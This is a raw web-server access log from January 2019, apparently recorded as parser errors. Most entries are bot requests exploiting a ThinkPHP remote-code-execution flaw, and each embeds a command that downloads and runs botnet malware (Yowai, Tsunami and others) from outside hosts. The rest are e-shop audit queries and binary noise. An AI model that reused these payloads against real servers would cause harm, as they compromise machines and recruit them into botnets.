%201269454,%201271601,%201281319,%201281955,%201281963,%201284376,%201284384,%201285870,%201297325,%201297418,%201297478,%201297568,%201300604,%201301447,%201305410,%201314283,%201318889,%201337836,%201346076,%201354400,%201366629,%201367123,%201395021,%201395654,%201421481,%201432628,%201451741,%201470828,%201471323,%201496571,%201529014,%201539414,%201548713,%201556967,%201557014,%201566785,%201579043,%201592644,%201593163,%201593315,%201595974,%201597675,%201601106,%201601143,%201602196,%201610854,%201628250,%201645519,%201652845,%201664613,%201675372,%201695593,%201695964,%201755648,%201759618,%201763488,%201780178,%201785993,%201802278,%201809730,%201821451,%201833352,%201844913,%201849719,%201853080,%201857891,%201866918,%201873176,%201884274,%201897789,%201897826,%201901597,%201901676,%201901756,%201901836,%201915053,%201919799,%201930840,%201937674,%201942528,%201953733,%201960552,%201960733,%201965101,%201967103,%20763952,%20779638,%20782959,%20784533,%20784579,%20797833,%20803321,%20803368,%20803414,%20803459,%20803503,%20803546,%20803588,%20803629,%20803631,%20804303,%20804337,%20804371,%20804405,%20804439,%20804473,%20809278,%20810311,%20811705,%20824384,%20824418,%20824451,%20824483,%20824514,%20824544,%20824573,%20824601,%20824628,%20824654,%20824679,%20824703,%20852838,%20859772,%20861149,%20866240,%20867921,%20873576,%20906069,%20977530,%20977605,%20987104,%20987119,%20992485,%201015076,%201019562,%201020022,%201022230,%201023627,%201034824,%201043821,%201043963,%201050124,%201058376,%201059102,%201065068,%201069942,%201071345,%201079335,%201080950,%201090610,%201090737,%201092158,%201098363,%201101427,%201106132,%201109468,%201109498,%201119046,%201119093,%201123632,%201124745,%201129641,%201138560,%201139683,%201140991,%201141059,%201141127,%201142401,%201142469,%201142537,%201142605,%201142673,%201143480,%201143548,%201143598,%201143684,%201145714,%201151566,%201151686,%201151687,%201152139,%201157542,%201159508,%201159541,%201161075,%201161108,%201165251,%201165284,%201165317,%201166527,%201166560,%201166961,%201173816,%201177624,%201177702,%201177780,%201177858,%201177936,%201184001,%201184078,%201184155,%201184232,%201185413,%201186798,%201188120,%201188188,%201188287,%201188354,%201188578,%201188644,%201188712,%201188777,%201188844,%201188908,%201188972,%201189038,%201189101,%201189166,%201189228,%201189292,%201189353,%201189416,%201189476,%201189538,%201189597,%201189658,%201189716,%201189774,%201189834,%201189891,%201189950,%201190006,%201190064,%201190119,%201190176,%201190232,%201190285,%201190603,%201190655,%201190708,%201190759,%201193818,%201194294,%201194368,%201195724,%201195776,%201197093,%201197171,%201199570,%201199675,%201201129,%201205464,%201205605,%201209124,%201212267,%201216414,%201217594,%201220269,%201227088,%201227564,%201227645,%201230543,%201230623,%201230703,%201231881,%201233243,%201235302,%201239010,%201239556,%201244184,%201244990,%201245029,%201247818,%201247857,%201247901,%201247932,%201247979,%201248018,%201248054,%201248092,%201248127,%20124816" 414 186 "-" "-" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:13:12:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('83.172.35.53 - - [26/Jan/2019:13:38:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('91.99.47.57 - - [26/Jan/2019:14:06:50 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:27316},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[54663,%2055707,%2061100]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[55649,%2055650]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[763951,%20779637,%20782958,%20784532,%20784578,%20797832,%20803320,%20803367,%20803413,%20803458,%20803502,%20803545,%20803587,%20803590,%20804302,%20804336,%20804370,%20804404,%20804438,%20804472,%20809277,%20810310,%20811704,%20824383,%20824417,%20824450,%20824482,%20824513,%20824543,%20824572,%20824600,%20824627,%20824653,%20824678,%20824702,%20852837,%20859771,%20861148,%20866239,%20867920,%20873575,%20906068,%20977529,%20977604,%20987103,%20987118,%20992484,%201015075,%201015236,%201018334,%201019561,%201019690,%201020021,%201022229,%201023626,%201027940,%201029796,%201029833,%201029862,%201029890,%201029917,%201029943,%201029968,%201029993,%201031971,%201034823,%201043820,%201043962,%201050123,%201058375,%201065067,%201069941,%201071344,%201077677,%201080949,%201085224,%201090609,%201090736,%201092157,%201098362,%201101426,%201103765,%201106131,%201109467,%201109497,%201119045,%201119092,%201123631,%201124744,%201129640,%201138559,%201139682,%201140990,%201141058,%201141126,%201142400,%201142468,%201142536,%201142604,%201142672,%201143479,%201143547,%201143596,%201143683,%201145713,%201151565,%201151684,%201151685,%201151741,%201151772,%201155866,%201157120,%201157149,%201157541,%201159507,%201159540,%201161074,%201161107,%201165250,%201165283,%201165316,%201166526,%201166559,%201166960,%201173815,%201177623,%201177701,%201177779,%201177857,%201177935,%201184000,%201184077,%201184154,%201184231,%201185412,%201186797,%201188119,%201188187,%201188286,%201188353,%201188577,%201188643,%201188711,%201188776,%201188843,%201188906,%201188971,%201189037,%201189100,%201189165,%201189227,%201189291,%201189352,%201189415,%201189475,%201189537,%201189596,%201189657,%201189715,%201189773,%201189833,%201189890,%201189949,%201190005,%201190063,%201190118,%201190175,%201190231,%201190284,%201190602,%201190654,%201190707,%201190758,%201193817,%201194293,%201194367,%201195723,%201195774,%201197092,%201197170,%201199569,%201199674,%201201128,%201205463,%201205604,%201209123,%201212266,%201216413,%201217593,%201220268,%201227087,%201227563,%201227644,%201230542,%201230622,%201230702,%201231880,%201232724,%201233242,%201235724,%201239555,%201244183,%201250187,%201251498,%201253242,%201255015,%201255101,%201255143,%201258416,%201258457,%201258498,%201258540,%201258580,%201258692,%201259180,%201259220,%201259307,%201259327,%201259380,%201261079,%201266335,%201266344,%201269454,%201271601,%201281319,%201281955,%201281963,%201284376,%201284384,%201285870,%201297325,%201297418,%201297478,%201297568,%201300604,%201301447,%201305410,%201314283,%201318889,%201337836,%201346076,%201354400,%201366629,%201367123,%201395021,%201395654,%201421481,%201432628,%201451741,%201470828,%201471323,%201496571,%201529014,%201539414,%201548713,%201556967,%201557014,%201566785,%201579043,%201592644,%201593163,%201593315,%201595974,%201597675,%201601106,%201601143,%201602196,%201610854,%201628250,%201645519,%201652845,%201664613,%201675372,%201695593,%201695964,%201755648,%201759618,%201763488,%201780178,%201785993,%201802278,%201809730,%201821451,%201833352,%201844913,%201849719,%201853080,%201857891,%201866918,%201873176,%201884274,%201897789,%201897826,%201901597,%201901676,%201901756,%201901836,%201915053,%201919799,%201930840,%201937674,%201942528,%201953733,%201960552,%201960733,%201965101,%201967103,%20763952,%20779638,%20782959,%20784533,%20784579,%20797833,%20803321,%20803368,%20803414,%20803459,%20803503,%20803546,%20803588,%20803629,%20803631,%20804303,%20804337,%20804371,%20804405,%20804439,%20804473,%20809278,%20810311,%20811705,%20824384,%20824418,%20824451,%20824483,%20824514,%20824544,%20824573,%20824601,%20824628,%20824654,%20824679,%20824703,%20852838,%20859772,%20861149,%20866240,%20867921,%20873576,%20906069,%20977530,%20977605,%20987104,%20987119,%20992485,%201015076,%201019562,%201020022,%201022230,%201023627,%201034824,%201043821,%201043963,%201050124,%201058376,%201059102,%201065068,%201069942,%201071345,%201079335,%201080950,%201090610,%201090737,%201092158,%201098363,%201101427,%201106132,%201109468,%201109498,%201119046,%201119093,%201123632,%201124745,%201129641,%201138560,%201139683,%201140991,%201141059,%201141127,%201142401,%201142469,%201142537,%201142605,%201142673,%201143480,%201143548,%201143598,%201143684,%201145714,%201151566,%201151686,%201151687,%201152139,%201157542,%201159508,%201159541,%201161075,%201161108,%201165251,%201165284,%201165317,%201166527,%201166560,%201166961,%201173816,%201177624,%201177702,%201177780,%201177858,%201177936,%201184001,%201184078,%201184155,%201184232,%201185413,%201186798,%201188120,%201188188,%201188287,%201188354,%201188578,%201188644,%201188712,%201188777,%201188844,%201188908,%201188972,%201189038,%201189101,%201189166,%201189228,%201189292,%201189353,%201189416,%201189476,%201189538,%201189597,%201189658,%201189716,%201189774,%201189834,%201189891,%201189950,%201190006,%201190064,%201190119,%201190176,%201190232,%201190285,%201190603,%201190655,%201190708,%201190759,%201193818,%201194294,%201194368,%201195724,%201195776,%201197093,%201197171,%201199570,%201199675,%201201129,%201205464,%201205605,%201209124,%201212267,%201216414,%201217594,%201220269,%201227088,%201227564,%201227645,%201230543,%201230623,%201230703,%201231881,%201233243,%201235302,%201239010,%201239556,%201244184,%201244990,%201245029,%201247818,%201247857,%201247901,%201247932,%201247979,%201248018,%201248054,%201248092,%201248127,%20124816" 414 186 "-" "-" "-"\n', 'list index out of range')
('117.198.103.115 - - [26/Jan/2019:14:35:34 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('125.165.180.211 - - [26/Jan/2019:14:59:11 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 301 178 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:15:21:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('203.115.99.150 - - [26/Jan/2019:15:26:17 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('99.100.6.45 - - [26/Jan/2019:17:00:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('92.56.8.28 - - [26/Jan/2019:17:04:42 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('162.220.144.211 - - [26/Jan/2019:17:43:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('110.14.105.47 - - [26/Jan/2019:18:30:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('91.238.210.203 - - [26/Jan/2019:18:58:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('185.105.4.172 - - [26/Jan/2019:19:14:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('192.99.203.185 - - [26/Jan/2019:19:24:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86\' HTTP/1.1" 400 166 "-" "Damien/2.0" "-"\n', 'list index out of range')
('78.208.45.38 - - [26/Jan/2019:19:24:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] "\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] "\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF" 400 166 "-" "-" "-"\n', 'list index out of range')
('126.60.209.224 - - [22/Jan/2019:09:35:56 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('72.52.125.78 - - [22/Jan/2019:09:55:32 +0330] "\\x17\\x10\\x05\\x15JL\\xAD\\xDC\\xCEL\\xC1Ff>F" 400 166 "-" "-" "-"\n', 'list index out of range')
('119.93.85.191 - - [22/Jan/2019:10:55:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('146.52.111.201 - - [22/Jan/2019:11:07:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('118.68.205.57 - - [22/Jan/2019:11:41:43 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('218.228.8.49 - - [22/Jan/2019:11:49:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('104.40.2.56 - - [22/Jan/2019:12:06:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('78.187.39.146 - - [22/Jan/2019:13:24:49 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('103.215.247.149 - - [22/Jan/2019:14:17:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('108.178.16.154 - - [22/Jan/2019:14:32:00 +0330] "j\\x00\\xA7\\x00\\xF3\\x00H\\x00z\\x00\\xF3\\x00\\xFE\\x00\\xFB\\x00\\x8E\\x00\\xFE\\x00H\\x00\\x8E\\x00H\\x00\\xF3\\x00\\xA7\\x00\\xD9\\x00\\xA7\\x00\\xF3\\x00\\xB0\\x00H\\x00\\x8B\\x00\\xF3\\x00\\xC5\\x00\\xC5\\x00\\xFC\\x00\\x8E\\x00\\xFB\\x00\\xFC\\x00\\xEC\\x00\\x8B\\x00\\xF3\\x00\\xD9\\x00\\xA7\\x00\\xFB\\x00\\xFC\\x00\\xEC\\x00\\x8E\\x00\\xF3\\x00\\xFB\\x00\\xA7\\x00\\xC5\\x00\\xF3\\x00\\xEC\\x00\\x09\\x00\\x17\\x00\\xD9\\x00\\xFB\\x00z\\x00\\xD9\\x00\\xC5\\x00\\xC5\\x00z\\x00\\x17\\x00\\xA7\\x00\\x17\\x00\\x8B\\x00\\xF3\\x00\\x17\\x00\\xA7\\x00j\\x00j\\x00\\xC5\\x00\\x8E\\x00\\x09\\x00\\x09\\x00\\x09\\x00\\x17\\x00\\xFB\\x00\\x8B\\x00z\\x00H\\x00\\xFB\\x00\\x8E\\x00\\xA7\\x00\\x09\\x00\\x8B\\x00\\x8E\\x00z\\x00z\\x00\\xB0\\x00\\x17\\x00\\x8E\\x00\\xC5\\x00j\\x00\\xEC\\x00\\xFB\\x00\\xEC\\x00\\xC5\\x00\\x8E\\x00\\xB0\\x00\\xC5\\x00\\x17\\x00\\x17\\x00H\\x00\\xFB\\x00\\xB0\\x00\\xA7\\x00\\xA7\\x00\\xFB\\x00\\xB0\\x00\\x8E\\x00\\xC5\\x00\\xB0\\x00H\\x00\\x17\\x00\\xC5\\x00\\x8B\\x00j\\x00\\x8E\\x00\\xEC\\x00\\xF3\\x00\\xFE\\x00\\xD9\\x00\\xF3\\x00\\xA7\\x00j\\x00\\xEC\\x00\\xA7\\x00\\xB0\\x00\\x17\\x00\\xFC\\x00H\\x00H\\x00\\x09\\x00\\x09\\x00\\x09\\x00H\\x00\\x8E\\x00\\xCE\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('1.52.109.77 - - [22/Jan/2019:14:33:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('120.75.116.136 - - [22/Jan/2019:14:56:10 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('37.191.134.207 - - [22/Jan/2019:15:14:37 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('5.140.135.145 - - [22/Jan/2019:15:23:27 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('88.247.102.229 - - [22/Jan/2019:15:54:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('202.214.186.65 - - [22/Jan/2019:16:32:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('49.241.214.70 - - [22/Jan/2019:16:52:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('151.239.241.163 - - [22/Jan/2019:17:40:26 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28790},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%